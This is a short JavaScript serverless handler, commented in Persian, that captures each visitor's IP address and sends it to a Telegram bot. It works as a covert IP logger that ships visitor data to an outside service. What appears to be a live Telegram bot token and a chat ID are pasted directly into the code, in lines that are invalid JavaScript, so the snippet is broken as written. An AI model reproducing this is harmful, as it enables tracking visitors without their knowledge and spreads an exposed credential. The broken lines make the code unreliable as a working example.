export default async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const token = process.env.7961668268:AAEGMLMj5TojYl3giXl_C8S0O2zH3Q8IeEU; // توکن رو در Environment بذار
  const chatId = process.env.7198165253;       // آی‌دی عددی خودت

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: `Visitor IP: ${ip}`
      })
    });
    res.status(200).send("IP sent to Telegram!");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending IP");
  }
}

